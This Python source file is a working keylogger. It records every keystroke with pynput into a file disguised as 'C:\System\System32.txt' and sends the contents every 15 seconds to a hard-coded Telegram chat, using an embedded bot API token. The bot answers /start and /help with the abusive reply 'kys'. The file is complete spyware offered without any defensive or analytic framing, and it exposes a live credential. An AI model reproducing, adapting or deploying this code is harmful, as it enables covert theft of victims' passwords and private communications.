import os
import telebot
import time
import threading
from pynput.keyboard import Key, Listener

API_TOKEN = '6071630449:AAHslhDKXn83m8gsfsB8m4_hQvw9-9N5pWE'
file_path = "C:\\System\\System32.txt"

bot = telebot.TeleBot(API_TOKEN)


# Key logging functionality
def on_key_press(key):
    with open(file_path, 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except AttributeError:
            if key == Key.space:
                logKey.write(" ")
            else:
                pass


os.makedirs(os.path.dirname(file_path), exist_ok=True)
key_listener = Listener(on_press=on_key_press)


def send_message_periodically():
    first_run = True  # To track if it's the first run
    while True:
        if not os.path.exists(file_path):
            with open(file_path, 'w') as start_file:
                start_file.write('start')
        with open(file_path, 'r') as file:
            try:
                file_contents = file.read()
                if first_run and not file_contents.strip():
                    with open(file_path, 'w') as start_file:
                        start_file.write('start')
                    first_run = False  # Mark the first run as completed
                bot.send_message('973147838', file_contents)
                # bot.send_message('', file_contents)
            except Exception as e:
                print('Error:', str(e))
        time.sleep(15)


message_thread = threading.Thread(target=send_message_periodically)
message_thread.start()


@bot.message_handler(commands=['help', 'start'])
def send_welcome(message):
    bot.reply_to(message, """\
kys
""")


@bot.message_handler(func=lambda message: True)
def echo_message(message):
    bot.reply_to(message, message.text)


key_listener.start()
bot.infinity_polling()
